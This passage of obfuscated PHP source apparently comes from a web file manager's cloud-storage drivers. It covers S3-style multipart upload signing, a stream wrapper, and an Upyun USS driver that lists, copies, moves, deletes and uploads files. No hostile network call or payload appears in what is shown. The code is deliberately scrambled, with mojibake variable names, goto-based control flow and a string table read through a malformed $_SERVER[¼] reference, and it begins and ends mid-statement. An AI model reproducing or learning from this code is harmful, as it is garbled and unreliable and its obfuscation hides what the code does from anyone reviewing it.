$E¿Ëë†ÀÔ©); } public function multiUploadAuthData($fá²ï‹Ğˆ¹, $a¹‹¢Ó¶‹ˆ = array()) { goto D½é–°¢Â¯; BÍù˜à‘¨è: $AÎíğÍ£ = $D¿é„‰–øà[211]; $Eó†ØÃÆì = $D¿é„‰–øà[8] . $this->pathEncode($b’‘çÍ¢÷Œ) . $cØ·óã—©; $BÉ¤¬ƒ”¨ì = $this->client->__getSignatureV4($E“” •ã¢£, $b£ƒïÌÑ’§, $AÎíğÍ£, $Eó†ØÃÆì); goto cÇ˜°Œ¾éÆ; D½é–°¢Â¯: $D¿é„‰–øà =& $_SERVER[¼]; $cØ·óã—© = isset($a¹‹¢Ó¶‹ˆ[$D¿é„‰–øà[157]]) ? $a¹‹¢Ó¶‹ˆ[$D¿é„‰–øà[157]] : $D¿é„‰–øà[33]; $b’‘çÍ¢÷Œ = $a¹‹¢Ó¶‹ˆ[$D¿é„‰–øà[89]]; goto d°åâ±Ã¦é; cÇ˜°Œ¾éÆ: if (strpos($cØ·óã—©, $D¿é„‰–øà[210]) === 0) { if (isset($E“” •ã¢£[$D¿é„‰–øà[1217]])) { $E´ï¦—»‡¦ = $E“” •ã¢£[$D¿é„‰–øà[1217]]; } else { if (isset($BÉ¤¬ƒ”¨ì[$D¿é„‰–øà[1217]])) { $E´ï¦—»‡¦ = $BÉ¤¬ƒ”¨ì[$D¿é„‰–øà[1217]]; } else { $E´ï¦—»‡¦ = hash($D¿é„‰–øà[1129], $D¿é„‰–øà[33]); } } return array($D¿é„‰–øà[217] => $BÉ¤¬ƒ”¨ì[$D¿é„‰–øà[217]], $D¿é„‰–øà[1217] => $E´ï¦—»‡¦, $D¿é„‰–øà[207] => $BÉ¤¬ƒ”¨ì[$D¿é„‰–øà[1220]]); } return $BÉ¤¬ƒ”¨ì[$D¿é„‰–øà[217]]; goto f½á£éí‰¸; CÓ‘°ï›ë: if (isset($a¹‹¢Ó¶‹ˆ[$D¿é„‰–øà[1216]])) { $E“” •ã¢£[$D¿é„‰–øà[1217]] = $a¹‹¢Ó¶‹ˆ[$D¿é„‰–øà[1216]]; } $D¯ó‰œÃŸÃ = explode($D¿é„‰–øà[168], $this->getHost()); $b£ƒïÌÑ’§ = array($D¿é„‰–øà[1218] => $D¯ó‰œÃŸÃ[1], $D¿é„‰–øà[1219] => $D¿é„‰–øà[33], $D¿é„‰–øà[196] => $D¿é„‰–øà[116], $D¿é„‰–øà[1131] => $a¹‹¢Ó¶‹ˆ[$D¿é„‰–øà[77]]); goto BÍù˜à‘¨è; d°åâ±Ã¦é: unset($a¹‹¢Ó¶‹ˆ[$D¿é„‰–øà[89]]); if (isset($a¹‹¢Ó¶‹ˆ[$D¿é„‰–øà[208]])) { return $this->listUploadParts($b’‘çÍ¢÷Œ, $a¹‹¢Ó¶‹ˆ); } $E“” •ã¢£ = array(); goto CÓ‘°ï›ë; f½á£éí‰¸: } public function listUploadParts($cÏÑ¤–«‚Œ, $a‰£Ãê¦§È = array()) { goto e¾«—ößˆ‡; c¼áõÇÃñ®: if (!$fí¤Äø¡Ä) { return !1; } $aÈÊˆ‹²áé = $B˜ùåªÕ¨Æ[1221]; foreach ($fí¤Äø¡Ä as $Bï…¨‹«ª) { $aÈÊˆ‹²áé .= $B˜ùåªÕ¨Æ[1222] . "\x3c\120\141\x72\x74\116\x75\x6d\x62\x65\x72\76{$Bï…¨‹«ª[$B˜ùåªÕ¨Æ[1173]]}\x3c\x2f\120\141\162\164\x4e\x75\155\142\x65\162\76\12" . "\x3c\x45\124\x61\147\x3e{$Bï…¨‹«ª[$B˜ùåªÕ¨Æ[1174]]}\x3c\x2f\x45\124\141\147\x3e\12" . $B˜ùåªÕ¨Æ[1223]; } goto fÀïŞ‰ï¡·; fÀïŞ‰ï¡·: $aÈÊˆ‹²áé .= $B˜ùåªÕ¨Æ[1224]; $Aİ‚ïÀ§ŠÃ = array(); $AÈ˜¿–ÚÚ = explode($B˜ùåªÕ¨Æ[168], $this->getHost()); goto Cæ¦—ŸŞÌ; e¾«—ößˆ‡: $B˜ùåªÕ¨Æ =& $_SERVER[¼]; $b·ØæÛ® = str_replace($B˜ùåªÕ¨Æ[218], $B˜ùåªÕ¨Æ[33], $a‰£Ãê¦§È[$B˜ùåªÕ¨Æ[157]]); $fí¤Äø¡Ä = $this->client->listParts($this->bucket, $cÏÑ¤–«‚Œ, $b·ØæÛ®); goto c¼áõÇÃñ®; bˆÅ’İÑÍ: $EÂç‡¼ÂÆÚ = $this->client->__getSignatureV4($Aİ‚ïÀ§ŠÃ, $AĞÃª¥©œ, $F›Ø¬¸ÌÀ‹, $Aêã­çùß×, $aÈÊˆ‹²áé); return array($B˜ùåªÕ¨Æ[217] => $EÂç‡¼ÂÆÚ[$B˜ùåªÕ¨Æ[217]], $B˜ùåªÕ¨Æ[207] => $EÂç‡¼ÂÆÚ[$B˜ùåªÕ¨Æ[1220]], $B˜ùåªÕ¨Æ[219] => $fí¤Äø¡Ä, $B˜ùåªÕ¨Æ[1217] => $EÂç‡¼ÂÆÚ[$B˜ùåªÕ¨Æ[1217]]); goto e…Ü¡ä•‘à; Cæ¦—ŸŞÌ: $AĞÃª¥©œ = array($B˜ùåªÕ¨Æ[1218] => $AÈ˜¿–ÚÚ[1], $B˜ùåªÕ¨Æ[196] => $B˜ùåªÕ¨Æ[116], $B˜ùåªÕ¨Æ[1131] => strlen($aÈÊˆ‹²áé)); $F›Ø¬¸ÌÀ‹ = $B˜ùåªÕ¨Æ[209]; $Aêã­çùß× = $B˜ùåªÕ¨Æ[8] . $this->pathEncode($cÏÑ¤–«‚Œ) . $a‰£Ãê¦§È[$B˜ùåªÕ¨Æ[157]]; goto bˆÅ’İÑÍ; e…Ü¡ä•‘à: } public function link($eèÇ‹ö Âä, $dƒ…ö½²Ï‹ = array()) { return parent::link($eèÇ‹ö Âä, $dƒ…ö½²Ï‹); } public function fileOut($Bù¼¦ïİ‡‡, $e°öö®ß† = false, $F‚ƒ“Ú“Å© = false, $bĞš´ƒÓƒ = '') { if (strstr($this->endpoint, $_SERVER[¼][1225])) { return parent::fileOutServer($Bù¼¦ïİ‡‡, $e°öö®ß†, $F‚ƒ“Ú“Å©, $bĞš´ƒÓƒ); } parent::fileOut($Bù¼¦ïİ‡‡, $e°öö®ß†, $F‚ƒ“Ú“Å©, $bĞš´ƒÓƒ); } public function fileOutImage($F‰‘—ë†èË, $CÑ­Ã©È = 250) { if (strstr($this->endpoint, $_SERVER[¼][1225])) { return parent::fileOutImageServer($F‰‘—ë†èË, $CÑ­Ã©È); } parent::fileOutImage($F‰‘—ë†èË, $CÑ­Ã©È); } public function fileOutLink($AÄŠŠÃª„) { $C¯î¶±åä‡ =& $_SERVER[¼]; if (substr($AÄŠŠÃª„, 0, 7) == $C¯î¶±åä‡[1101]) { $AÄŠŠÃª„ = $C¯î¶±åä‡[1102] . substr($AÄŠŠÃª„, 7); } header($C¯î¶±åä‡[153] . $AÄŠŠÃª„); die; } public function getHost() { $CÔ‰ÙéíŸ’ =& $_SERVER[¼]; $C´…ö©‰÷´ = str_rtrim(parent::getHost(), $CÔ‰ÙéíŸ’[8] . $this->bucket); $C´…ö©‰÷´ = explode($CÔ‰ÙéíŸ’[168], $C´…ö©‰÷´); return $C´…ö©‰÷´[0] . $CÔ‰ÙéíŸ’[168] . $this->bucket . $CÔ‰ÙéíŸ’[93] . $C´…ö©‰÷´[1]; } } class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($bĞ‰‡ÓÙà™, $c¯…Ùèã³‡ = 0) { parent::__construct(); $this->source = $bĞ‰‡ÓÙà™; $this->sourceSize = $c¯…Ùèã³‡; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($AÓñ¦±Á°ø = false) { return $this->sourceSize; } public function getContent($F·Ç•ª»§— = false) { if ($this->sourceType == self::TYPE_STRING) { return $this->source; } if ($this->sourceType == self::TYPE_FILE) { $C‘±ÂÌÆ = ftell($this->source); $d—ˆÀòœÁ¡ = @fread($this->source, $this->sourceSize); fseek($this->source, $C‘±ÂÌÆ); return $d—ˆÀòœÁ¡; } } public function fileSubstr($BÂ§“³…Ä = false, $D®Ñù‹ŞÅ = 0, $eÆ‡‡àŠœÃ = 0) { if (!$eÆ‡‡àŠœÃ) { $eÆ‡‡àŠœÃ = $this->sourceSize; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $D®Ñù‹ŞÅ, $eÆ‡‡àŠœÃ); } if ($this->sourceType == self::TYPE_FILE) { $a»Œ¢–¥‘á = ftell($this->source); fseek($this->source, $a»Œ¢–¥‘á + $D®Ñù‹ŞÅ); $a„ÌéİÂ– = @fread($this->source, $eÆ‡‡àŠœÃ); fseek($this->source, $a»Œ¢–¥‘á); return $a„ÌéİÂ–; } } public function hashMd5($EÏŠĞÉ‰Ş¯ = false) { return md5($this->getContent()); } public static function hash($fÒ…õøÖÊÕ, $bğß¥¤ÏãÆ = 0) { $BˆË–å¯Í = new PathDriverStream($fÒ…õøÖÊÕ, $bğß¥¤ÏãÆ); return $BˆË–å¯Í->hashSimple($fÒ…õøÖÊÕ); } public static function md5($C© ä‡´ãÃ, $Bà„ÂÉ„‚° = 0) { $bÒ˜¿Ğ¿Ù = new PathDriverStream($C© ä‡´ãÃ, $Bà„ÂÉ„‚°); return $bÒ˜¿Ğ¿Ù->hashMd5($C© ä‡´ãÃ); } } class PathDriverUSS extends PathDriverBase { protected $bucket = ''; protected $username = ''; protected $userpass = ''; protected $domain = ''; protected $token = ''; protected $endpoint = "\x68\x74\164\x70\72\57\x2f\x76\60\x2e\141\160\151\x2e\165\x70\171\x75\x6e\x2e\143\x6f\155"; public $ioUploadServer = 0; public $ioFileOutServer = 0; public function __construct($aµ”Š×°¦«) { parent::__construct(); $this->_init($aµ”Š×°¦«); } public function _init($bòÈéŠÚ…Î) { foreach ($bòÈéŠÚ…Î as $dïº¦ÖŞ† => $AÕ£®Š°¹Ç) { if (isset($this->{$dïº¦ÖŞ†})) { $this->{$dïº¦ÖŞ†} = $AÕ£®Š°¹Ç; } } if (empty($this->username) || empty($this->userpass) || empty($this->domain)) { show_json($_SERVER[¼][1226], !1); } } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } private function ussHeaders($Fë’„÷“Œ, $aŒš‡’†Î™ = "\x47\x45\x54") { $cÚ¥Œ›¶‘ =& $_SERVER[¼]; $AšçËƒ×¸Ò = gmdate($cÚ¥Œ›¶‘[1190]); $CŒ÷¡Ãñ›’ = base64_encode(hash_hmac($cÚ¥Œ›¶‘[1227], "{$aŒš‡’†Î™}\46{$Fë’„÷“Œ}\x26{$AšçËƒ×¸Ò}", md5("{$this->userpass}"), !0)); $Fš˜Ì¦Ï¤ = array("\x41\x75\x74\150\x6f\x72\151\x7a\x61\164\151\157\x6e\72\125\x50\131\125\116\40{$this->username}\72{$CŒ÷¡Ãñ›’}", "\104\141\x74\x65\x3a{$AšçËƒ×¸Ò}"); return $Fš˜Ì¦Ï¤; } public function ussRequest($cÖÏŠå·», $b˜Ùˆ§ôìì = "\x47\105\124", $Bó‘Ùë¬á = false, $e¯¥±óÕò = false, $EîÙÂ¾Ğò… = false) { goto b¬­µœŸ±×; b¬­µœŸ±×: $bã¡’Ÿ¢Å” =& $_SERVER[¼]; $cÖÏŠå·» = trim($cÖÏŠå·», $bã¡’Ÿ¢Å”[8]); $B‡ƒÆ‘šßÏ = "\57{$this->bucket}\57{$cÖÏŠå·»}"; goto bƒî°èÁ«»; Fƒ…æ‘´: if (!$B‡½Ù¸Œ¿é) { return array($bã¡’Ÿ¢Å”[1025] => !1, $bã¡’Ÿ¢Å”[1027] => $bã¡’Ÿ¢Å”[1228]); } if (strtolower($b˜Ùˆ§ôìì) == $bã¡’Ÿ¢Å”[181] || in_array($B‡½Ù¸Œ¿é[$bã¡’Ÿ¢Å”[1025]], array($bã¡’Ÿ¢Å”[1086], $bã¡’Ÿ¢Å”[1229]))) { $Bó‘Ùë¬á = $B‡½Ù¸Œ¿é[$bã¡’Ÿ¢Å”[1230]]; } else { $Bó‘Ùë¬á = json_decode($B‡½Ù¸Œ¿é[$bã¡’Ÿ¢Å”[1027]], !0); if (!$Bó‘Ùë¬á) { $Bó‘Ùë¬á = $B‡½Ù¸Œ¿é[$bã¡’Ÿ¢Å”[1027]]; } else { if (!$B‡½Ù¸Œ¿é[$bã¡’Ÿ¢Å”[681]] && isset($Bó‘Ùë¬á[$bã¡’Ÿ¢Å”[1231]])) { $Bó‘Ùë¬á = $Bó‘Ùë¬á[$bã¡’Ÿ¢Å”[1231]]; } } } return array($bã¡’Ÿ¢Å”[1025] => $B‡½Ù¸Œ¿é[$bã¡’Ÿ¢Å”[681]], $bã¡’Ÿ¢Å”[1027] => $Bó‘Ùë¬á); goto C«¨òŠì¸Ó; bƒî°èÁ«»: $aäø¯ÛÇøË = $this->ussHeaders($B‡ƒÆ‘šßÏ, $b˜Ùˆ§ôìì); if ($e¯¥±óÕò) { $aäø¯ÛÇøË = array_merge($aäø¯ÛÇøË, $e¯¥±óÕò); } $B‡½Ù¸Œ¿é = url_request($this->endpoint . $B‡ƒÆ‘šßÏ, $b˜Ùˆ§ôìì, $Bó‘Ùë¬á, $aäø¯ÛÇøË, $EîÙÂ¾Ğò…); goto Fƒ…æ‘´; C«¨òŠì¸Ó: } public function mkfile($DõÔËêÕš‰, $Fçİ¼ºÊªµ = '', $e½—Õ÷˜Ö = REPEAT_RENAME) { if ($this->setContent($DõÔËêÕš‰, $Fçİ¼ºÊªµ)) { return $this->getPathOuter($DõÔËêÕš‰); } return !1; } public function mkdir($AÑ®ÔÍ’ÍÅ, $C°ÏÖÍëôí = REPEAT_SKIP) { $b›š¥¼…î¶ =& $_SERVER[¼]; $bµ¸É—²˜ = trim($AÑ®ÔÍ’ÍÅ, $b›š¥¼…î¶[8]); if ($this->_isFolder($bµ¸É—²˜)) { return $this->getPathOuter($bµ¸É—²˜); } $d¶ì™óïˆ = array($b›š¥¼…î¶[1232]); $b”›¾°äÄ = $this->ussRequest($bµ¸É—²˜, $b›š¥¼…î¶[209], !1, $d¶ì™óïˆ); return $b”›¾°äÄ[$b›š¥¼…î¶[1025]] ? $this->getPathOuter($bµ¸É—²˜) : !1; } public function copyFile($E–ÎÑâÛÔ², $c³®’“¹Ú) { $BáÃÒİ¸” =& $_SERVER[¼]; $e­Ô”¤İ‘‚ = array($BáÃÒİ¸”[1233] . "\x2f{$this->bucket}\57{$E–ÎÑâÛÔ²}", $BáÃÒİ¸”[1234]); $eõÁ‘äğÀ = $this->ussRequest($c³®’“¹Ú, $BáÃÒİ¸”[211], !1, $e­Ô”¤İ‘‚); return $eõÁ‘äğÀ[$BáÃÒİ¸”[1025]] ? !0 : !1; } public function moveFile($E…èõ¢œÁ„, $aŒ³ØÕèÌÀ) { $dõ‘éÛÑêˆ =& $_SERVER[¼]; $Eß¡÷åÂ„ƒ = array($dõ‘éÛÑêˆ[1235] . "\x2f{$this->bucket}\57{$E…èõ¢œÁ„}", $dõ‘éÛÑêˆ[1234]); $F³ÑÈ—¡íä = $this->ussRequest($aŒ³ØÕèÌÀ, $dõ‘éÛÑêˆ[211], !1, $Eß¡÷åÂ„ƒ); return $F³ÑÈ—¡íä[$dõ‘éÛÑêˆ[1025]] ? !0 : !1; } public function delFile($fŒÃÌØ°²ö) { $AãàŠŸàŠŸ =& $_SERVER[¼]; $CÂÏÕšğë† = $this->ussRequest($fŒÃÌØ°²ö, $AãàŠŸàŠŸ[1236]); return $CÂÏÕšğë†[$AãàŠŸàŠŸ[1025]] ? !0 : !1; } public function delFolder($F¤š åˆ®©) { $b‚Ğº§¦•¢ =& $_SERVER[¼]; $c›öÆŞ”â‡ = $this->listAll($F¤š åˆ®©); krsort($c›öÆŞ”â‡); foreach ($c›öÆŞ”â‡ as $Eš¦åÃ¥œ×) { $this->ussRequest($Eš¦åÃ¥œ×[$b‚Ğº§¦•¢[75]], $b‚Ğº§¦•¢[1236]); } return $this->ussRequest($F¤š åˆ®©, $b‚Ğº§¦•¢[1236]); } public function rename($Fã•¸¨–¸‹, $A„±Â¼‹Á) { if ($this->isFile($Fã•¸¨–¸‹)) { $A„±Â¼‹Á = get_path_father($Fã•¸¨–¸‹) . $A„±Â¼‹Á; return $this->moveFile($Fã•¸¨–¸‹, $A„±Â¼‹Á); } return $this->renameObject($Fã•¸¨–¸‹, $A„±Â¼‹Á); } public function fileInfo($f¾“ÒŠÆ¨ª, $aùŠï„íô× = false, $Fòã•„¥ˆŠ = array()) { $aÕ©ö”â =& $_SERVER[¼]; if ($aùŠï„íô×) { return array($aÕ©ö”â[28] => $this->pathThis($f¾“ÒŠÆ¨ª), $aÕ©ö”â[75] => $this->getPathOuter($aÕ©ö”â[8] . $f¾“ÒŠÆ¨ª), $aÕ©ö”â[29] => $aÕ©ö”â[164], $aÕ©ö”â[77] => isset($Fòã•„¥ˆŠ[$aÕ©ö”â[322]]) ? $Fòã•„¥ˆŠ[$aÕ©ö”â[322]] : 0, $aÕ©ö”â[157] => $this->ext($f¾“ÒŠÆ¨ª)); } $CÓÄ¤ß…Ï = array($aÕ©ö”â[28] => $this->pathThis($f¾“ÒŠÆ¨ª), $aÕ©ö”â[75] => $this->getPathOuter($aÕ©ö”â[8] . $f¾“ÒŠÆ¨ª), $aÕ©ö”â[29] => $aÕ©ö”â[164], $aÕ©ö”â[184] => 0, $aÕ©ö”â[107] => isset($A¥ê‘¿ÔÈ[$aÕ©ö”â[1237]]) ? $A¥ê‘¿ÔÈ[$aÕ©ö”â[1237]] : 0, $aÕ©ö”â[77] => isset($Fòã•„¥ˆŠ[$aÕ©ö”â[322]]) ? $Fòã•„¥ˆŠ[$aÕ©ö”â[322]] : 0, $aÕ©ö”â[157] => $this->ext($f¾“ÒŠÆ¨ª), $aÕ©ö”â[185] => !0, $aÕ©ö”â[186] => !0); if (empty($Fòã•„¥ˆŠ)) { $Fòã•„¥ˆŠ = $this->objectMeta($f¾“ÒŠÆ¨ª); if (!$Fòã•„¥ˆŠ) { return $CÓÄ¤ß…Ï; } $CÓÄ¤ß…Ï[$aÕ©ö”â[184]] = $Fòã•„¥ˆŠ[$aÕ©ö”â[1238]]; $CÓÄ¤ß…Ï[$aÕ©ö”â[107]] = $Fòã•„¥ˆŠ[$aÕ©ö”â[1239]]; $CÓÄ¤ß…Ï[$aÕ©ö”â[77]] = $Fòã•„¥ˆŠ[$aÕ©ö”â[77]]; } return $CÓÄ¤ß…Ï; } public function folderInfo($DÔ¼Á­”óò, $F³„ôŠùšê = false) { $D¢¡¥³¬â¾ =& $_SERVER[¼]; if ($F³„ôŠùšê) { return array($D¢¡¥³¬â¾[28] => $this->pathThis($DÔ¼Á­”óò), $D¢¡¥³¬â¾[75] => $this->getPathOuter($D¢¡¥³¬â¾[8] . $DÔ¼Á­”óò), $D¢¡¥³¬â¾[29] => $D¢¡¥³¬â¾[76]); } $E²İƒğî°ö = array($D¢¡¥³¬â¾[28] => $this->pathThis($DÔ¼Á­”óò), $D¢¡¥³¬â¾[75] => $this->getPathOuter($D¢¡¥³¬â¾[8] . $DÔ¼Á­”óò), $D¢¡¥³¬â¾[29] => $D¢¡¥³¬â¾[76], $D¢¡¥³¬â¾[184] => 0, $D¢¡¥³¬â¾[107] => isset($A¨£½ëºïæ[$D¢¡¥³¬â¾[1237]]) ? $A¨£½ëºïæ[$D¢¡¥³¬â¾[1237]] : 0, $D¢¡¥³¬â¾[1147] => !0, $D¢¡¥³¬â¾[1148] => !0); if (empty($BÄøÆ®Â„ª)) { $BÄøÆ®Â„ª = $this->objectMeta($DÔ¼Á­”óò); if (!$BÄøÆ®Â„ª) { return $E²İƒğî°ö; } $E²İƒğî°ö[$D¢¡¥³¬â¾[184]] = $BÄøÆ®Â„ª[$D¢¡¥³¬â¾[1238]]; $E²İƒğî°ö[$D¢¡¥³¬â¾[107]] = $BÄøÆ®Â„ª[$D¢¡¥³¬â¾[1239]]; } return $E²İƒğî°ö; } private function fileList($D«ˆ¼ëçè©, $d–à£Óİ˜™ = 0, $A…ÖŒÜ„ñÄ = 1000) { $c“»ù†…çÂ =& $_SERVER[¼]; $c¬’×ƒØ‘§ = array($c“»ù†…çÂ[1240], $c“»ù†…çÂ[1241] . $A…ÖŒÜ„ñÄ); if ($d–à£Óİ˜™) { $c¬’×ƒØ‘§[] = $c“»ù†…çÂ[1242] . $d–à£Óİ˜™; } $B¼Â» “ = $this->ussRequest($D«ˆ¼ëçè©, $c“»ù†…çÂ[213], !1, $c¬’×ƒØ‘§); return !$B¼Â» “[$c“»ù†…çÂ[1025]] ? !1 : $B¼Â» “[$c“»ù†…çÂ[1027]]; } public function listPath($EæĞ—Çèñ, $bİ®˜ùäÁè = false) { goto bĞÏ…øèÅ; e®õƒŠÖÁ: return array($F¿¢˜Š¸–[74] => $fíí¤«„, $F¿¢˜Š¸–[73] => $c›“­ÅØìÑ); goto B“‡Š£ÎÒ­; Dçñ•Ñ±î…: $fíí¤«„ = $c›“­ÅØìÑ = array(); $eĞõÖ‹¹öÂ = rtrim($EæĞ—Çèñ, $F¿¢˜Š¸–[8]) . $F¿¢˜Š¸–[8]; while (!0) { $dõ Ö§º§© = $this->fileList($EæĞ—Çèñ, $eé²³˜‘Ú, $F”å‚ØÔòß); if (!$dõ Ö§º§©) { return !1; } $eé²³˜‘Ú = isset($dõ Ö§º§©[$F¿¢˜Š¸–[1243]]) ? $dõ Ö§º§©[$F¿¢˜Š¸–[1243]] : $F¿¢˜Š¸–[33]; $dõ“½‚ëË‚ = isset($dõ Ö§º§©[$F¿¢˜Š¸–[1244]]) ? $dõ Ö§º§©[$F¿¢˜Š¸–[1244]] : array(); foreach ($dõ“½‚ëË‚ as $fœÔñ•ÊĞ) { if ($fœÔñ•ÊĞ[$F¿¢˜Š¸–[29]] == $F¿¢˜Š¸–[76]) { $fíí¤«„[] = $this->folderInfo($eĞõÖ‹¹öÂ . $fœÔñ•ÊĞ[$F¿¢˜Š¸–[28]], $bİ®˜ùäÁè, $fœÔñ•ÊĞ); } else { $c›“­ÅØìÑ[] = $this->fileInfo($eĞõÖ‹¹öÂ . $fœÔñ•ÊĞ[$F¿¢˜Š¸–[28]], $bİ®˜ùäÁè, $fœÔñ•ÊĞ); } } if (count($dõ“½‚ëË‚) < $F”å‚ØÔòß) { break; } } goto e®õƒŠÖÁ; bĞÏ…øèÅ: $F¿¢˜Š¸– =& $_SERVER[¼]; $eé²³˜‘Ú = $F¿¢˜Š¸–[33]; $F”å‚ØÔòß = 1000; goto Dçñ•Ñ±î…; B“‡Š£ÎÒ­: } private function recursionAllFiles($bŠêò‡Ş, &$aâŒ‹©’œÅ) { $f¸øéÊÛÂÙ =& $_SERVER[¼]; $dÎåô¥Š± = $f¸øéÊÛÂÙ[33]; $dƒ§œô“Ë = 1000; $e‚¦º”İí = $e¸·æÅöî = array(); $Cñõğ´Ö = rtrim($bŠêò‡Ş, $f¸øéÊÛÂÙ[8]) . $f¸øéÊÛÂÙ[8]; while (!0) { $f¤‚¢í Û = $this->fileList($bŠêò‡Ş, $dÎåô¥Š±, $dƒ§œô“Ë); if (!$f¤‚¢í Û) { return !1; } $dÎåô¥Š± = isset($f¤‚¢í Û[$f¸øéÊÛÂÙ[1243]]) ? $f¤‚¢í Û[$f¸øéÊÛÂÙ[1243]] : $f¸øéÊÛÂÙ[33]; $b°Ş›ò‚äÀ = isset($f¤‚¢í Û[$f¸øéÊÛÂÙ[1244]]) ? $f¤‚¢í Û[$f¸øéÊÛÂÙ[1244]] : array(); foreach ($b°Ş›ò‚äÀ as $aÍ…š´ˆËß) { $D¨Ë–ØÇš¿ = array($f¸øéÊÛÂÙ[75] => $Cñõğ´Ö . $aÍ…š´ˆËß[$f¸øéÊÛÂÙ[28]], $f¸øéÊÛÂÙ[76] => $aÍ…š´ˆËß[$f¸øéÊÛÂÙ[29]] == $f¸øéÊÛÂÙ[76] ? 1 : 0, $f¸øéÊÛÂÙ[77] => isset($aÍ…š´ˆËß[$f¸øéÊÛÂÙ[322]]) ? $aÍ…š´ˆËß[$f¸øéÊÛÂÙ[322]] : 0); $aâŒ‹©’œÅ[] = $D¨Ë–ØÇš¿; if ($D¨Ë–ØÇš¿[$f¸øéÊÛÂÙ[76]] == 1) { $this->recursionAllFiles($D¨Ë–ØÇš¿[$f¸øéÊÛÂÙ[75]], $aâŒ‹©’œÅ); } } if (count($b°Ş›ò‚äÀ) < $dƒ§œô“Ë) { break; } } } public function has($EÓë íğ, $F²Œé¹âÄ = false, $e·›šÙÍ›Ñ = true) { goto Bß±¡íÖë; Bß±¡íÖë: $bß»êë´¤ =& $_SERVER[¼]; $Fƒ²¦‡º = $bß»êë´¤[33]; $BÂ´½Ò‚¼ß = 1000; goto cã¶ßôÎ§ç; fÓÚ–åÔÊø: while (!0) { $Dˆî‹˜Àœø = $this->fileList($EÓë íğ, $Fƒ²¦‡º, $BÂ´½Ò‚¼ß); if (!$Dˆî‹˜Àœø) { return !1; } $Fƒ²¦‡º = isset($Dˆî‹˜Àœø[$bß»êë´¤[1243]]) ? $Dˆî‹˜Àœø[$bß»êë´¤[1243]] : $bß»êë´¤[33]; $f¬õ•¡™è = isset($Dˆî‹˜Àœø[$bß»êë´¤[1244]]) ? $Dˆî‹˜Àœø[$bß»êë´¤[1244]] : array(); if (empty($f¬õ•¡™è)) { break; } $Fö¯ÉêÈˆÈ = array_to_keyvalue($f¬õ•¡™è, $bß»êë´¤[33], $bß»êë´¤[29]); $aíé—¬ØÜ¾ = array_count_values($Fö¯ÉêÈˆÈ); $a¯æ±«¢³ˆ = isset($aíé—¬ØÜ¾[$bß»êë´¤[76]]) ? $aíé—¬ØÜ¾[$bß»êë´¤[76]] : 0; $f¾¿‹ÌäÁë = count($Fö¯ÉêÈˆÈ) - $a¯æ±«¢³ˆ; if ($F²Œé¹âÄ) { $C½”ˆƒŞã += $a¯æ±«¢³ˆ; $dº£ÕÜø­Ø += $f¾¿‹ÌäÁë; if ($A„”‘§Ä < $BÂ´½Ò‚¼ß) { break; } continue; } if ($e·›šÙÍ›Ñ) { if ($f¾¿‹ÌäÁë) { return !0; } } else { if ($a¯æ±«¢³ˆ) { return !0; } } if (count($f¬õ•¡™è) < $BÂ´½Ò‚¼ß) { break; } } if ($F²Œé¹âÄ) { return array($bß»êë´¤[188] => $dº£ÕÜø­Ø, $bß»êë´¤[189] => $C½”ˆƒŞã); } return !1; goto aˆĞŞ™ìøĞ; cã¶ßôÎ§ç: $dº£ÕÜø­Ø = 0; $C½”ˆƒŞã = 0; $EÕÇ£ë™ = rtrim($EÓë íğ, $bß»êë´¤[8]) . $bß»êë´¤[8]; goto fÓÚ–åÔÊø; aˆĞŞ™ìøĞ: } public function listAll($F´ËéÆãŞ…) { $EÕØÉ¤ òº = array(); $this->recursionAllFiles($F´ËéÆãŞ…, $EÕØÉ¤ òº); return $EÕØÉ¤ òº; } public function canRead($AÓ•Âëôô‹) { return $this->exist($AÓ•Âëôô‹) ? !0 : !1; } public function canWrite($D”êƒ‰ŸËË) { return $this->exist($D”êƒ‰ŸËË) ? !0 : !1; } public function getContent($c¤â˜èÛá„) { return $this->fileSubstr($c¤â˜èÛá„, 0, -1); } public function setContent($e×Øï®Ë½·, $B§Íµ ³ùƒ = '') { $a«˜½õéŞÉ =& $_SERVER[¼]; if (!$B§Íµ ³ùƒ) { $eß ì©Ñ®Ê = $this->ussRequest($e×Øï®Ë½·, $a«˜½õéŞÉ[209]); return $eß ì©Ñ®Ê[$a«˜½õéŞÉ[1025]]; } $C³†ÓÕ‡¤Ë = $this->tempFile($this->pathThis($e×Øï®Ë½·)); file_put_contents($C³†ÓÕ‡¤Ë, $B§Íµ ³ùƒ); if ($this->upload($e×Øï®Ë½·, $C³†ÓÕ‡¤Ë)) { $this->tempFileRemve($C³†ÓÕ‡¤Ë); return !0; } return !1; } public function fileSubstr($bäŸ¢Ä¤ö, $D“ÚÕÀäğê, $Cœ¢¿‚Íõ†) { $Cå„½É™¢ =& $_SERVER[¼]; if (!($aä´¬ŒÉØ = $this->link($bäŸ¢Ä¤ö))) { return !1; } $Dí§Ğ³‚İá = !1; if ($Cœ¢¿‚Íõ† > 0) { $cºÃ·ÜôŠÔ = $D“ÚÕÀäğê + $Cœ¢¿‚Íõ† - 1; $Dí§Ğ³‚İá = array($Cå„½É™¢[1205] . $D“ÚÕÀäğê . $Cå„½É™¢[408] . $cºÃ·ÜôŠÔ); } $D÷åĞñÙÏÈ = url_request($aä´¬ŒÉØ, $Cå„½É™¢[213], !1, $Dí§Ğ³‚İá); return $D÷åĞñÙÏÈ[$Cå„½É™¢[681]] ? $D÷åĞñÙÏÈ[$Cå„½É™¢[1027]] : !1; } public function upload($F£Ÿ¡Ó‹¿™, $dÁ…²ê“Ó, $A»“ØØ©‚ = false, $b¤Î†‘ã÷ƒ = REPEAT_REPLACE) { goto CŸ¦ÖÏÅ¯Ì; Bºß„¥ªïÖ: $D‹ó÷¨ìÏÄ = array($CÑ“ˆó½ˆÛ[1252], $CÑ“ˆó½ˆÛ[1253] . $E”Îâå´Ë[$CÑ“ˆó½ˆÛ[1254]], $CÑ“ˆó½ˆÛ[1248]); $Dˆ‡Î“¦ = $this->ussRequest($F£Ÿ¡Ó‹¿™, $CÑ“ˆó½ˆÛ[211], !1, $D‹ó÷¨ìÏÄ); return $Dˆ‡Î“¦[$CÑ“ˆó½ˆÛ[1025]] ? $this->getPathOuter($CæÁ¦”§îö) : !1; goto E–ªôãÀî; CŸ¦ÖÏÅ¯Ì: 